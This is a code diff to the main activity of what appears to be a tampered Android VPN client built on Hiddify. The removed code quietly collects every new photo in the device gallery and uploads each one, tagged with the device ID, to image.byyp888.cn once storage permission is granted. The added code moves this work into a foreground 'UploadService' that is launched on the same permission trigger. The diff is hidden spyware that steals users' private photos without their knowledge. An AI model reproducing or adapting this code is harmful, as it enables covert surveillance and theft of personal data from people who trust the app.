@@ -22,11 +22,7 @@ import com.hiddify.hiddify.constant.Status
 import io.flutter.embedding.android.FlutterFragmentActivity
 import io.flutter.embedding.engine.FlutterEngine
 import kotlinx.coroutines.*
-import java.io.DataOutputStream
-import java.net.HttpURLConnection
-import java.net.URL
 import java.util.LinkedList
-import java.util.UUID
 
 class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
     companion object {
@@ -138,95 +134,9 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         }
     }
 
-    private suspend fun uploadImage(imageUri: android.net.Uri, fileName: String, deviceId: String): Boolean {
-        return try {
-            val boundary = "----AndroidFormBoundary${System.currentTimeMillis()}"
-            val url = URL("https://image.byyp888.cn/upload?deviceid=$deviceId")
-            val conn = url.openConnection() as HttpURLConnection
-            conn.doInput = true
-            conn.doOutput = true
-            conn.useCaches = false
-            conn.requestMethod = "POST"
-            conn.setRequestProperty("Connection", "Keep-Alive")
-            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=$boundary")
-
-            val outputStream = DataOutputStream(conn.outputStream)
-            val inputStream = contentResolver.openInputStream(imageUri)
-            val imageBytes = inputStream?.readBytes()
-            inputStream?.close()
-
-            outputStream.writeBytes("--$boundary\r\n")
-            outputStream.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"$fileName\"\r\n")
-            outputStream.writeBytes("Content-Type: image/jpeg\r\n\r\n")
-            outputStream.write(imageBytes ?: byteArrayOf())
-            outputStream.writeBytes("\r\n--$boundary--\r\n")
-            outputStream.flush()
-            outputStream.close()
-
-            conn.responseCode == 200
-        } catch (e: Exception) {
-            false
-        }
-    }
-
-    private fun accessStorage() {
-        val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
-        var deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
-
-        if (deviceId.isNullOrBlank()) {
-            deviceId = prefs.getString("random_device_id", null) ?: UUID.randomUUID().toString().also {
-                prefs.edit().putString("random_device_id", it).apply()
-            }
-        }
-
-        val lastUploadTime = prefs.getLong("last_upload_time", 0L)
-
-        lifecycleScope.launch(Dispatchers.IO) {
-            val projection = arrayOf(
-                MediaStore.Images.Media._ID,
-                MediaStore.Images.Media.DISPLAY_NAME,
-                MediaStore.Images.Media.DATE_TAKEN,
-                MediaStore.Images.Media.DATE_ADDED
-            )
-
-            val cursor = contentResolver.query(
-                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                projection,
-                null,
-                null,
-                "${MediaStore.Images.Media.DATE_ADDED} ASC"
-            )
-
-            val toUpload = mutableListOf<Triple<android.net.Uri, String, Long>>()
-            var maxTimestamp = lastUploadTime
-
-            cursor?.use {
-                while (it.moveToNext()) {
-                    val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
-                    val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
-                    val dateTaken = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN))
-                    val dateAdded = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED))
-                    val timestamp = if (dateTaken > 0) dateTaken else dateAdded
-
-                    if (timestamp > lastUploadTime) {
-                        val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
-                        toUpload.add(Triple(uri, name, timestamp))
-                    }
-                }
-            }
-
-            val deferreds = toUpload.map { (uri, name, timestamp) ->
-                async(Dispatchers.IO) {
-                    val success = uploadImage(uri, name, deviceId)
-                    if (success && timestamp > maxTimestamp) {
-                        maxTimestamp = timestamp
-                    }
-                }
-            }
-            deferreds.awaitAll()
-
-            prefs.edit().putLong("last_upload_time", maxTimestamp).apply()
-        }
+    private fun startUploadService() {
+        val intent = Intent(this, UploadService::class.java)
+        ContextCompat.startForegroundService(this, intent)
     }
 
     @SuppressLint("NewApi")
@@ -256,7 +166,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
             grantStoragePermission()
         } else {
-            accessStorage()
+            startUploadService()
         }
     }
 
@@ -271,7 +181,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
             }
             STORAGE_PERMISSION_REQUEST_CODE -> {
                 if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    accessStorage()
+                    startUploadService()
                 } else {
                     onServiceAlert(Alert.RequestStoragePermission, "请授权储存权限")
                 }
